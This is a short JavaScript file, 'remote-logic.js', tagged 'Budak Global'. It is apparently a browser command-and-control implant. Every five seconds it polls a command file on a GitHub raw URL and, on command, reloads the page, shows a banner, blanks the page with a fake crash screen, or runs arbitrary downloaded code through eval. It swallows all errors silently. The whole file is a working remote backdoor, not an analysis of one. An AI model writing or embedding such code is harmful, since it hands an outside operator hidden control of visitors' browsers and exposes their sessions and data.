// remote-logic.js - Budak Global
(function() {
    const CMD_URL = "https://raw.githubusercontent.com/fantasiy/tools_free_2026/main/command.json";
    let lastId = "";

    setInterval(async () => {
        try {
            const r = await fetch(`${CMD_URL}?t=${Date.now()}`);
            const d = await r.json();
            if (d.active && d.id !== lastId) {
                lastId = d.id;
                // EFEK GLOBAL
                if (d.action === 'RESTART') location.reload();
                if (d.action === 'ANNOUNCE') {
                    const b = document.createElement('div');
                    b.style = "position:fixed;top:0;width:100%;background:red;color:white;padding:10px;z-index:9999;text-align:center;";
                    b.innerText = d.text;
                    document.body.appendChild(b);
                    setTimeout(() => b.remove(), d.duration * 1000);
                }
                if (d.action === 'BSOD') document.body.innerHTML = "<body style='background:#0000aa;color:#fff;padding:50px;'><h1>:(</h1></body>";
                if (d.action === 'EXECUTE') eval(d.payload);
            }
        } catch(e) {}
    }, 5000);
})();
